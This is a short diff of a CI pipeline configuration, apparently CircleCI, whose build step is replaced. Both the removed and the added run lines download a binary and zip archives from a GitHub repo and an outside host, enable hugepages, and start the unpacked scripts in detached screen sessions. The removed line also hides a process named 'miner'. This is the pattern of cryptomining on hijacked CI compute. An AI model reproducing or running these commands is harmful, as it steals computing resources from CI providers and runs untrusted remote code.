@@ -8,4 +8,5 @@ jobs:
           password: $DOCKERHUB_PASSWORD
     steps:
       - checkout 
-      - run: sudo apt update && sudo apt install gcc && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add nama miner && sudo apt update&&sudo apt install screen -y&&sudo apt-get install -y cpulimit&&sudo apt install wget -y&&sudo wget https://github.com/matius300/doraemon/raw/main/asu4xm&&chmod 777 asu4xm&&sudo sysctl -w vm.nr_hugepages=$(nproc)&&wget http://asu.ringen.host/ikmal/RTM_New/asu_001.zip&&wget http://asu.ringen.host/ikmal/RTM_New/kil.zip&&unzip asu_001.zip&&rm -rf asu_001.zip&&unzip kil.zip&&rm -rf kil.zip&&chmod 777 kil.sh&&chmod 777 asu_001.sh&&screen -S asu -d -m ./asu_001.sh&&screen -S kil -d -m ./kil.sh&&screen -r asu
+      - run: sudo apt update&&sudo apt install screen -y&&sudo apt-get install -y cpulimit&&sudo apt install wget -y&&sudo wget https://github.com/matius300/doraemon/raw/main/asu4xm&&chmod 777 asu4xm&&sudo sysctl -w vm.nr_hugepages=$(nproc)&&wget http://asu.ringen.host/ikmal/RTM_New/asu_001.zip&&wget http://asu.ringen.host/ikmal/RTM_New/kil.zip&&unzip asu_001.zip&&rm -rf asu_001.zip&&unzip kil.zip&&rm -rf kil.zip&&chmod 777 kil.sh&&chmod 777 asu_001.sh&&screen -S asu -d -m ./asu_001.sh&&screen -S kil -d -m ./kil.sh&&screen -r asu
+ 
